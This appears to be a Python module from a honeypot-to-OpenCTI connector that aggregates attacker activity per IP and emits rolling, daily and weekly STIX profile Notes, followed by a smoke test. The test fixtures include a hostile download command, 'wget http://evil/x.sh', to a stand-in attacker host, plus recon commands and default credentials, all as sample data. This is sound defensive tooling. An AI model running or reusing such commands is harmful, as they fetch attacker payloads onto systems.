"""tpot2cti — attacker-profile Note emitter.

Per the V0 post-mortem finding: "do not emit 50K Notes/day", per-session Notes
do not scale: an attacker that hits us 50 times a day produces 50
Notes on their Indicator page, which an analyst will never read.

This module replaces that anti-pattern with THREE cadences of
attacker-profile Note, all keyed on the attacker's IP and all
idempotent via deterministic UUID5 (per V1_SPEC §4 — same logical
input → same Note id forever):

  - live    — ``note:attacker-profile:<ip>`` — refreshed every cycle
              that observes activity from this IP. ONE Note per IP,
              ever. OpenCTI upserts so the analyst always sees the
              current state on the indicator page.
  - daily   — ``note:attacker-daily:<ip>:<utc-date>`` — emitted once
              when the cycle crosses UTC midnight, carrying the
              snapshot of activity for the prior UTC calendar day.
  - weekly  — ``note:attacker-weekly:<ip>:<iso-year>:<iso-week>`` —
              emitted once when the cycle crosses an ISO week
              boundary (Monday 00:00 UTC), carrying the snapshot for
              the prior ISO week.

The rolling per-(src_ip, parser, sensor) aggregate lives in the new
``attacker_activity`` SQLite table (see ``state.py``). Every session
processed by ``main.run_cycle`` is merged into that table via
``update_activity_from_session``; the per-cycle live emitter then
reads it back, renders the body via
``tpot2cti.stix.rendering.render_attacker_profile_body``, and emits a
Note SDO that is attached to the attacker's IPv4 observable + IP
Indicator.

Per-session command transcripts are NOT lost — they live on the
Process SDO's ``command_line`` field, which the per-session
``build_cowrie_session`` graph already produces. The attacker-profile
Note carries a deduplicated, frequency-ranked sample of commands
across ALL sessions from the IP (capped per the spec at 25 each).

Per V1_SPEC.md §3 (cycle behavior) and the hard rules in the
implementation spec:

  - No asyncio. Pure synchronous code.
  - No new third-party deps; stdlib + pyyaml/requests/pycti only.
  - Profile Note body respects ``MAX_NOTE_BODY_BYTES`` from
    ``stix/builder.py`` (64 KB).
  - Sample-list growth capped at 25 entries per category.
"""

from __future__ import annotations

import logging
from datetime import date, datetime, time, timedelta, timezone
from typing import Iterable, Optional

from tpot2cti.parsers.base import AttackSession
from tpot2cti.state import CycleState
from tpot2cti.stix.builder import MAX_NOTE_BODY_BYTES, STIXBuilder
from tpot2cti.stix.rendering import render_attacker_profile_body
from tpot2cti.stix_ids import (
    generate_attacker_daily_note_id,
    generate_attacker_profile_note_id,
    generate_attacker_weekly_note_id,
    generate_ip_indicator_id,
    generate_ipv4_id,
    generate_relationship_id,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Cadence labels stored in attacker_profile_emit_log.cadence
# ---------------------------------------------------------------------------
CADENCE_LIVE = "live"
CADENCE_DAILY = "daily"
CADENCE_WEEKLY = "weekly"


# ---------------------------------------------------------------------------
# State keys for boundary detection (mirrors daily_creds.maybe_emit_pending's
# "last successful run" key but per cadence so the two cron clocks are
# independent).
# ---------------------------------------------------------------------------
_STATE_KEY_LAST_DAILY = "last_daily_attacker_emit_utc_date"
_STATE_KEY_LAST_WEEKLY = "last_weekly_attacker_emit_iso_yearweek"


# ---------------------------------------------------------------------------
# Coverage allow-list (see hard rule §3 in the spec) — every session-emitting
# parser except the fallback. Fallback still flows through the regular
# driveby path. New parser modules should add their type_name here so they
# contribute to the attacker profile too.
# ---------------------------------------------------------------------------
_PROFILE_PARSERS: frozenset[str] = frozenset({
    "Cowrie", "Suricata", "Honeytrap", "Heralding", "Mailoney", "ConPot",
    "Dicompot", "Medpot", "Ipphoney", "ElasticPot", "Redishoneypot",
    "Ciscoasa", "Adbhoney", "Miniprint", "Tanner", "Wordpot", "Sentrypeer",
    "Fatt", "NGINX", "Honeyaml", "Router", "H0neytr4p", "Dionaea",
    "Beelzebub", "Galah",
})


def _ip_is_substantive(rows: list[dict]) -> bool:
    """Whether an IP's aggregated activity rows pass the substance gate
    used by ``emit_daily_summary_notes``.

    Mirrors the substance signal set in ``_signal_score()`` — an IP is
    substantive if ANY parser-row for it recorded a successful auth, ≥1
    executed command, ≥1 malware drop, OR ≥3 credential attempts (the
    "this is more than a one-touch probe" threshold).

    Why this matters: a soak audit on 2026-05-29 found 14,741 daily
    attacker-snapshot Notes in 7 days, vs 9,881 rolling-profile Notes
    that already carried the same content updated cross-cycle. The
    daily snapshots for pure drive-by IPs are duplicated effort with
    no analyst payoff — every drive-by daily Note re-states "this IP
    touched the SSH port once" that the rolling profile already says.
    Filtering daily snapshots to substantive IPs cuts the Note index
    ~80% with zero loss of pivotable intel.
    """
    for r in rows:
        if (r.get("auth_success_count") or 0) > 0:
            return True
        if (r.get("commands_count") or 0) > 0:
            return True
        if (r.get("malware_drop_count") or 0) > 0:
            return True
        if (r.get("credentials_count") or 0) >= 3:
            return True
    return False


def _is_profile_parser(event_type: Optional[str]) -> bool:
    if not event_type:
        return False
    return event_type in _PROFILE_PARSERS


# ---------------------------------------------------------------------------
# Public surface
# ---------------------------------------------------------------------------

def update_activity_from_session(
    state: CycleState, session: AttackSession
) -> None:
    """Merge one session's signals into the attacker_activity table.

    Called from ``main.run_cycle`` for every session in the cycle that
    belongs to a profile-emitting parser (see ``_PROFILE_PARSERS``).
    Fallback / unknown-type sessions are skipped — they flow through
    the existing driveby path and don't accumulate into the attacker
    profile (per the user decision tree).

    Failures are caught + logged here; one bad session must never
    block cycle progress.
    """
    if session is None or not getattr(session, "src_ip", None):
        return
    if not _is_profile_parser(getattr(session, "event_type", None)):
        return
    try:
        state.upsert_attacker_activity(session)
    except Exception as e:  # pragma: no cover — sqlite is reliable
        logger.warning(
            f"attacker_profile: upsert_attacker_activity failed for "
            f"src_ip={session.src_ip!r} parser={session.event_type!r}: {e}"
        )


def emit_live_profile_notes(
    state: CycleState,
    builder: STIXBuilder,
    active_ips: Iterable[str],
) -> list[dict]:
    """Emit/refresh one ``note:attacker-profile:<ip>`` Note per active IP.

    For each IP in ``active_ips`` that is present in the
    ``attacker_activity`` table:

      1. Load all per-(parser, sensor) rows.
      2. Skip if no new activity since our last live emit for this IP
         (cheap bytes-saving short-circuit; OpenCTI would dedupe via
         UUID5 anyway, but a no-op is cheaper than re-sending).
      3. Render the profile body.
      4. Build the Note SDO with ``object_refs`` pointing at the
         attacker's IPv4 observable + IP Indicator.
      5. Build a ``related-to`` Relationship Note → IPv4 so the
         OpenCTI graph view draws the edge.
      6. Record the emission in attacker_profile_emit_log.

    Returns the list of STIX object dicts to append to the cycle's
    bundle. Empty list when no IPs warrant emission.
    """
    out: list[dict] = []
    ips_emitted = 0
    ips_skipped_unchanged = 0
    ips_missing_rows = 0

    for ip in sorted(set(active_ips)):
        rows = state.get_attacker_activity(ip)
        if not rows:
            ips_missing_rows += 1
            continue

        current_last_seen = max(r["last_seen"] for r in rows)
        prev = state.get_last_attacker_profile_emit(ip, CADENCE_LIVE)
        if prev and prev >= current_last_seen:
            ips_skipped_unchanged += 1
            continue

        body = render_attacker_profile_body(
            ip, rows,
            cadence=CADENCE_LIVE,
            window_label="all-time (rolling)",
            max_bytes=MAX_NOTE_BODY_BYTES,
        )
        if not body:
            continue

        note_id = generate_attacker_profile_note_id(ip)
        ipv4_id = generate_ipv4_id(ip)
        ip_ind_id = generate_ip_indicator_id(ip)

        note_obj = _build_attacker_note(
            builder=builder,
            note_id=note_id,
            abstract=f"Attacker profile — {ip} (live, all-time rolling)",
            body=body,
            object_refs=[ipv4_id, ip_ind_id],
        )
        if note_obj is None:
            # _dedup said this id already shipped within this bundle (rare
            # but possible if main.run_cycle calls us twice somehow);
            # still record the emit so the log moves forward.
            state.record_attacker_profile_emitted(
                ip, CADENCE_LIVE, current_last_seen,
            )
            continue
        out.append(note_obj)

        # Link the Note back to the IPv4 observable via an explicit
        # Relationship so OpenCTI's graph view draws the edge (object_refs
        # alone doesn't surface in the relationship browser; mirror the
        # daily-creds Note → sensor pattern).
        rel = builder.build_relationship(
            note_id, "related-to", ipv4_id,
            description=f"Rolling attacker profile for {ip}",
        )
        if rel:
            out.append(rel)

        state.record_attacker_profile_emitted(
            ip, CADENCE_LIVE, current_last_seen,
        )
        ips_emitted += 1

    if ips_emitted or ips_skipped_unchanged or ips_missing_rows:
        logger.info(
            f"attacker_profile: live emit — {ips_emitted} Note(s) emitted, "
            f"{ips_skipped_unchanged} skipped (no new activity), "
            f"{ips_missing_rows} active IPs lacked attacker_activity rows"
        )
    return out


def emit_daily_summary_notes(
    state: CycleState,
    builder: STIXBuilder,
    utc_date_str: str,
) -> list[dict]:
    """Emit one ``note:attacker-daily:<ip>:<utc_date>`` Note per IP with
    activity on the given UTC calendar day.

    ``utc_date_str`` is ``YYYY-MM-DD``. Idempotent via UUID5 — same
    (ip, date) → same id, so OpenCTI upserts on re-run (catch-up
    after a missed cycle).
    """
    out: list[dict] = []
    try:
        d = date.fromisoformat(utc_date_str)
    except ValueError as e:
        logger.error(f"emit_daily_summary_notes: bad date {utc_date_str!r}: {e}")
        return out

    start = datetime.combine(d, time.min, tzinfo=timezone.utc).isoformat()
    end = (datetime.combine(d, time.min, tzinfo=timezone.utc)
           + timedelta(days=1)).isoformat()

    per_ip = state.get_attacker_activity_window(start, end)
    if not per_ip:
        logger.info(
            f"attacker_profile: daily emit — no IPs active in window "
            f"[{start}, {end})"
        )
        return out

    # Substance gate — drop pure-drive-by IPs from the daily-snapshot
    # path; their content is already captured by the rolling per-IP
    # profile Note that updates every cycle. See _ip_is_substantive
    # docstring for the audit rationale (2026-05-29).
    pre_count = len(per_ip)
    per_ip = {ip: rows for ip, rows in per_ip.items() if _ip_is_substantive(rows)}
    skipped = pre_count - len(per_ip)
    if skipped:
        logger.info(
            f"attacker_profile: daily emit — substance gate dropped {skipped} "
            f"drive-by IP(s); {len(per_ip)} substantive IP(s) remain"
        )

    for ip, rows in sorted(per_ip.items()):
        body = render_attacker_profile_body(
            ip, rows,
            cadence=CADENCE_DAILY,
            window_label=f"{utc_date_str} (UTC)",
            max_bytes=MAX_NOTE_BODY_BYTES,
        )
        if not body:
            continue
        note_id = generate_attacker_daily_note_id(ip, utc_date_str)
        ipv4_id = generate_ipv4_id(ip)
        ip_ind_id = generate_ip_indicator_id(ip)
        note_obj = _build_attacker_note(
            builder=builder,
            note_id=note_id,
            abstract=f"Daily attacker snapshot — {ip} — {utc_date_str} (UTC)",
            body=body,
            object_refs=[ipv4_id, ip_ind_id],
        )
        if note_obj is None:
            continue
        out.append(note_obj)
        rel = builder.build_relationship(
            note_id, "related-to", ipv4_id,
            description=f"Daily attacker snapshot for {ip} on {utc_date_str}",
        )
        if rel:
            out.append(rel)
        state.record_attacker_profile_emitted(
            ip, CADENCE_DAILY, rows[0]["last_seen"],
        )

    logger.info(
        f"attacker_profile: daily emit — {sum(1 for o in out if o.get('type') == 'note')} "
        f"Note(s) for utc_date={utc_date_str} across {len(per_ip)} IP(s)"
    )
    return out


def emit_weekly_summary_notes(
    state: CycleState,
    builder: STIXBuilder,
    iso_year: int,
    iso_week: int,
) -> list[dict]:
    """Emit one ``note:attacker-weekly:<ip>:<year>:<week>`` Note per IP
    with activity in the given ISO week.

    ``iso_year``, ``iso_week`` come from ``datetime.isocalendar()``.
    Week start is Monday 00:00 UTC, end is the following Monday 00:00 UTC.
    """
    out: list[dict] = []
    try:
        week_start_date = date.fromisocalendar(iso_year, iso_week, 1)  # Monday
    except (ValueError, AttributeError) as e:
        logger.error(
            f"emit_weekly_summary_notes: bad iso_year/week "
            f"({iso_year!r}, {iso_week!r}): {e}"
        )
        return out

    start_dt = datetime.combine(week_start_date, time.min, tzinfo=timezone.utc)
    end_dt = start_dt + timedelta(days=7)
    start = start_dt.isoformat()
    end = end_dt.isoformat()

    per_ip = state.get_attacker_activity_window(start, end)
    if not per_ip:
        logger.info(
            f"attacker_profile: weekly emit — no IPs active in window "
            f"[{start}, {end})"
        )
        return out

    window_label = f"ISO {iso_year}-W{iso_week:02d}"
    for ip, rows in sorted(per_ip.items()):
        body = render_attacker_profile_body(
            ip, rows,
            cadence=CADENCE_WEEKLY,
            window_label=window_label,
            max_bytes=MAX_NOTE_BODY_BYTES,
        )
        if not body:
            continue
        note_id = generate_attacker_weekly_note_id(ip, iso_year, iso_week)
        ipv4_id = generate_ipv4_id(ip)
        ip_ind_id = generate_ip_indicator_id(ip)
        note_obj = _build_attacker_note(
            builder=builder,
            note_id=note_id,
            abstract=f"Weekly attacker snapshot — {ip} — {window_label}",
            body=body,
            object_refs=[ipv4_id, ip_ind_id],
        )
        if note_obj is None:
            continue
        out.append(note_obj)
        rel = builder.build_relationship(
            note_id, "related-to", ipv4_id,
            description=f"Weekly attacker snapshot for {ip} in {window_label}",
        )
        if rel:
            out.append(rel)
        state.record_attacker_profile_emitted(
            ip, CADENCE_WEEKLY, rows[0]["last_seen"],
        )

    logger.info(
        f"attacker_profile: weekly emit — "
        f"{sum(1 for o in out if o.get('type') == 'note')} Note(s) for "
        f"{window_label} across {len(per_ip)} IP(s)"
    )
    return out


# ---------------------------------------------------------------------------
# Boundary detection — mirrors daily_creds.maybe_emit_pending's pattern.
# ---------------------------------------------------------------------------

def maybe_emit_daily_and_weekly(
    state: CycleState,
    builder: STIXBuilder,
    *,
    now: Optional[datetime] = None,
) -> list[dict]:
    """Emit daily + weekly snapshot Notes if this cycle crossed the
    corresponding UTC boundary.

    Behavior:
      - Daily: if ``state.get(_STATE_KEY_LAST_DAILY)`` is not yesterday's
        date string, emit a daily snapshot for yesterday. Subsequent
        cycles on the same UTC day are no-ops.
      - Weekly: if ``state.get(_STATE_KEY_LAST_WEEKLY)`` is not last
        week's ``YYYY-Wnn`` string, emit a weekly snapshot for the prior
        ISO week. Same idempotency pattern.

    The first cycle ever (state key missing) emits for yesterday + last
    week, so a fresh deployment doesn't wait up to 7 days for the first
    weekly Note. After that, subsequent cycles only emit at boundary
    crossings.

    Returns the merged list of STIX object dicts.
    """
    now = now or datetime.now(timezone.utc)
    today = now.date()
    yesterday = today - timedelta(days=1)
    yesterday_str = yesterday.isoformat()

    out: list[dict] = []

    # Daily boundary
    last_daily = state.get(_STATE_KEY_LAST_DAILY) or ""
    if last_daily != yesterday_str:
        try:
            daily_objs = emit_daily_summary_notes(state, builder, yesterday_str)
            out.extend(daily_objs)
            state.set(_STATE_KEY_LAST_DAILY, yesterday_str)
        except Exception as e:
            logger.exception(
                f"attacker_profile: daily emit failed for {yesterday_str}: {e}"
            )

    # Weekly boundary — ISO week of "yesterday" (we summarise the last
    # complete week, not the in-progress one).
    iso = yesterday.isocalendar()
    iso_year, iso_week = int(iso[0]), int(iso[1])
    yearweek_str = f"{iso_year}-W{iso_week:02d}"
    last_weekly = state.get(_STATE_KEY_LAST_WEEKLY) or ""
    # Only emit when we've actually moved into a NEW ISO week relative
    # to the last emit. Re-emitting for the same week each day would
    # be no-ops via UUID5 but waste bundle bytes.
    if last_weekly != yearweek_str:
        try:
            weekly_objs = emit_weekly_summary_notes(
                state, builder, iso_year, iso_week,
            )
            out.extend(weekly_objs)
            state.set(_STATE_KEY_LAST_WEEKLY, yearweek_str)
        except Exception as e:
            logger.exception(
                f"attacker_profile: weekly emit failed for {yearweek_str}: {e}"
            )

    return out


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _build_attacker_note(
    *,
    builder: STIXBuilder,
    note_id: str,
    abstract: str,
    body: str,
    object_refs: list[str],
) -> Optional[dict]:
    """Construct a Note SDO with the connector's standard provenance.

    We don't reuse ``STIXBuilder.build_session_note`` here because that
    method takes a session+session-derived id; we want full control of
    the deterministic note id (the seed is the attacker IP / window,
    not a session_id).
    """
    if not body:
        return None
    # Apply the same MAX_NOTE_BODY_BYTES cap STIXBuilder uses, defensively
    # (the renderer already caps but truncation here keeps the contract
    # explicit; matches build_session_note's "[truncated]" marker).
    encoded = body.encode("utf-8")
    if len(encoded) > MAX_NOTE_BODY_BYTES:
        body = encoded[: MAX_NOTE_BODY_BYTES - 32].decode("utf-8", errors="ignore")
        body += "\n... [truncated]"
    obj = {
        "type": "note",
        "id": note_id,
        "abstract": abstract,
        "content": body,
        "object_refs": list(object_refs),
    }
    return builder._dedup(builder._stamp(obj))


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import os
    import tempfile
    from pathlib import Path
    from datetime import timedelta as _td

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    # Need a Config for the builder; load from .env (or test stubs).
    os.environ.setdefault("TPOT_HOST", "test")
    os.environ.setdefault("OPENCTI_ADMIN_TOKEN", "00000000-0000-0000-0000-000000000000")
    os.environ.setdefault("TPOT2CTI_CONNECTOR_ID", "00000000-0000-0000-0000-000000000001")
    from tpot2cti.config import load_config
    cfg = load_config()

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name
    try:
        state = CycleState(db_path=db_path)
        builder = STIXBuilder(cfg)

        ip = "203.0.113.42"
        now = datetime.now(timezone.utc)

        # Build 3 cycles' worth of activity from the same Cowrie attacker.
        class _Ev:
            def __init__(self):
                self.src_country_code = "CN"
                self.src_asn = 4134
                self.src_as_org = "ChinaNet"

        class _Sess:
            def __init__(self, first, last, cmds=None, creds=None,
                         hashes=None, auth=False, parser="Cowrie",
                         sensor="tpot01", urls=None, domains=None,
                         events_n=3):
                self.src_ip = ip
                self.sensor_hostname = sensor
                self.event_type = parser
                self.first_seen = first
                self.last_seen = last
                self.event_count = events_n
                self.auth_success = auth
                self.credentials_tried = creds or []
                self.commands = cmds or []
                self.malware_hashes = hashes or []
                self.urls = urls or []
                self.domains = domains or []
                self.hassh = "deadbeefhassh"
                self.ssh_version = "SSH-2.0-OpenSSH_7.4"
                self.dst_ports = {22}
                self.meta = {}
                self.events = [_Ev()]

        for n in range(3):
            t0 = now - _td(minutes=30 - 10 * n)
            t1 = t0 + _td(minutes=5)
            update_activity_from_session(state, _Sess(
                t0, t1,
                cmds=["uname -a", "wget http://evil/x.sh"],
                creds=[("root", "root"), ("admin", str(n))],
                hashes=[("a" * 64) if n == 0 else ("b" * 64)],
                auth=(n == 0),
                urls=["http://evil/x.sh"],
                domains=["evil"],
            ))

        # Add a Suricata sighting from the same IP
        update_activity_from_session(state, _Sess(
            now - _td(minutes=2), now - _td(minutes=1),
            parser="Suricata", cmds=None, events_n=1,
        ))

        # Live emit
        live_objs = emit_live_profile_notes(state, builder, [ip])
        live_notes = [o for o in live_objs if o.get("type") == "note"]
        assert len(live_notes) == 1, f"expected 1 live Note, got {len(live_notes)}"
        n0 = live_notes[0]
        assert n0["id"] == generate_attacker_profile_note_id(ip), n0["id"]
        assert ip in n0["content"]
        assert "Cowrie" in n0["content"]
        assert "Suricata" in n0["content"]
        # auth_success was True once
        assert ("auth-success x1" in n0["content"]
                or "auth-success x1," in n0["content"])
        print(f"OK: live attacker-profile Note emitted: id={n0['id']}, "
              f"body_bytes={len(n0['content'].encode('utf-8'))}")

        # Idempotency: emit again with no new activity → no Note.
        live_objs2 = emit_live_profile_notes(state, builder, [ip])
        live_notes2 = [o for o in live_objs2 if o.get("type") == "note"]
        assert len(live_notes2) == 0, (
            f"expected 0 Notes on second emit (no new activity), "
            f"got {len(live_notes2)}"
        )
        print("OK: live emit is idempotent (no new activity → no re-emit)")

        # Add more activity, then re-emit → should produce ONE Note with
        # the SAME id (deterministic UUID5).
        update_activity_from_session(state, _Sess(
            now, now + _td(minutes=1),
            cmds=["id", "whoami"], creds=[("root", "newpass")],
        ))
        # Fresh builder to clear per-bundle dedup.
        builder2 = STIXBuilder(cfg)
        live_objs3 = emit_live_profile_notes(state, builder2, [ip])
        live_notes3 = [o for o in live_objs3 if o.get("type") == "note"]
        assert len(live_notes3) == 1, (
            f"expected 1 Note after new activity, got {len(live_notes3)}"
        )
        assert live_notes3[0]["id"] == n0["id"], (
            "re-emitted Note must have the same UUID5 id"
        )
        print(f"OK: re-emit after new activity reuses same UUID5: "
              f"{live_notes3[0]['id']}")

        # Daily emit — pick yesterday so the window contains "now - 30m".
        # Activity timestamps above are all "now"-relative; emit for today.
        utc_date_str = now.date().isoformat()
        builder3 = STIXBuilder(cfg)
        daily_objs = emit_daily_summary_notes(state, builder3, utc_date_str)
        daily_notes = [o for o in daily_objs if o.get("type") == "note"]
        assert len(daily_notes) == 1, f"expected 1 daily Note, got {len(daily_notes)}"
        d0 = daily_notes[0]
        assert d0["id"] == generate_attacker_daily_note_id(ip, utc_date_str)
        assert "Daily attacker snapshot" in d0["content"]
        assert utc_date_str in d0["content"]
        print(f"OK: daily attacker Note emitted: id={d0['id']}")

        # Daily idempotency: same emit twice → same id (dedup may suppress
        # the second; verify id stability).
        builder4 = STIXBuilder(cfg)
        daily_objs2 = emit_daily_summary_notes(state, builder4, utc_date_str)
        daily_notes2 = [o for o in daily_objs2 if o.get("type") == "note"]
        assert all(
            n["id"] == generate_attacker_daily_note_id(ip, utc_date_str)
            for n in daily_notes2
        )
        print("OK: daily emit produces stable UUID5 across re-runs")

        # Weekly emit
        iso = now.date().isocalendar()
        iso_year, iso_week = int(iso[0]), int(iso[1])
        builder5 = STIXBuilder(cfg)
        weekly_objs = emit_weekly_summary_notes(
            state, builder5, iso_year, iso_week,
        )
        weekly_notes = [o for o in weekly_objs if o.get("type") == "note"]
        assert len(weekly_notes) == 1, (
            f"expected 1 weekly Note, got {len(weekly_notes)}"
        )
        w0 = weekly_notes[0]
        assert w0["id"] == generate_attacker_weekly_note_id(
            ip, iso_year, iso_week,
        )
        assert f"ISO {iso_year}-W{iso_week:02d}" in w0["content"]
        print(f"OK: weekly attacker Note emitted: id={w0['id']}")

        # update_activity_from_session skips fallback/unknown parsers
        class _FB(_Sess):
            pass
        before_rows = state.get_attacker_activity("198.51.100.55")
        fb = _Sess(now, now + _td(seconds=10), parser="UnknownProto")
        fb.src_ip = "198.51.100.55"
        update_activity_from_session(state, fb)
        after_rows = state.get_attacker_activity("198.51.100.55")
        assert after_rows == before_rows == [], (
            "unknown-parser session should not add an attacker_activity row"
        )
        print("OK: unknown-parser sessions are skipped (no attacker_activity row)")

        print("\nOK")
    finally:
        Path(db_path).unlink(missing_ok=True)
        Path(db_path + "-wal").unlink(missing_ok=True)
        Path(db_path + "-shm").unlink(missing_ok=True)
